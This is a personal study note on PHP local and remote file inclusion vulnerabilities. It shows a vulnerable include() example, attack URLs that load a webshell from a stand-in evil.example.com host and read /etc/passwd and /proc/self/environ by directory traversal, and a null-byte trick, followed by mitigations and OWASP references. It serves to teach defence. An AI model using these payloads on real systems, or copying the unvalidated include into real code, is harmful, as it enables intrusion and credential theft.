Personal Home Page [[PHP]]
**Include and require allow for ##RFI (remote file inclusivity) and ##LHI (local file inclusivity)** 
**	Exploitations: Adding onto =?  and adding/../../..etc/password**


Here’s the text without asterisks for easy copying:

---

### File Inclusion Vulnerability Notes 📝  

#### 📌 Overview of File Inclusion in PHP
- PHP applications may include user-supplied files using `include` or `require`, leading to vulnerabilities.
- The `allow_url_fopen` and `allow_url_include` directives (before PHP 5.2.0) allow remote file inclusion (RFI).
- If input is not validated, attackers can manipulate the file path to access unintended files.

---

### 📂 Example of Vulnerable Code
```php
if (isset($_GET['language'])) {
    include($_GET['language'] . '.php');
}
```
- Intended to load `english.php` or `french.php`, but an attacker can modify the `language` parameter.

---

### ⚠️ Exploitation Techniques
#### 1️⃣ Remote File Inclusion (RFI)
- If `allow_url_include=On`, an attacker can inject external scripts:
  ```
  /vulnerable.php?language=http://evil.example.com/webshell.txt
  ```
  - This loads and executes a remote malicious file.

#### 2️⃣ Local File Inclusion (LFI)
- Instead of a valid file, an attacker can navigate directories:
  ```
  /vulnerable.php?language=../../../../etc/passwd
  ```
  - Reads system files like `/etc/passwd` (user accounts).

#### 3️⃣ Windows File Path Injection
- Load files from Windows directories:
  ```
  /vulnerable.php?language=C:\ftp\upload\exploit
  ```

#### 4️⃣ Null Byte Injection (Old PHP Versions)
- Older PHP versions allowed null byte termination:
  ```
  /vulnerable.php?language=C:\notes.txt%00
  ```
  - This bypassed the `.php` suffix restriction (patched in PHP 5.3+).

#### 5️⃣ Accessing Environment Variables
- Read system environment variables:
  ```
  /vulnerable.php?language=../../../../proc/self/environ
  ```
  - Could expose server credentials.

---

### 🛡️ Mitigation Strategies
✅ Whitelist Allowed Files  
```php
$allowed = ['english', 'french'];
if (isset($_GET['language']) && in_array($_GET['language'], $allowed)) {
    include($_GET['language'] . '.php');
}
```
✅ Disable Remote Includes (`php.ini` settings):  
```
allow_url_include=Off
allow_url_fopen=Off
```
✅ Use Absolute Paths to prevent directory traversal.  
✅ Sanitize User Input (Remove `../` to prevent traversal).  
✅ Use a Switch/Case Statement instead of direct `include()`.

---

### 🔍 Reference Materials
- Wikipedia: [File Inclusion Vulnerability](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)  
- OWASP Guide: [Testing for Local File Inclusion](https://owasp.org/www-community/attacks/Testing_for_Local_File_Inclusion)  

---


![[Pasted image 20250212142352.png]]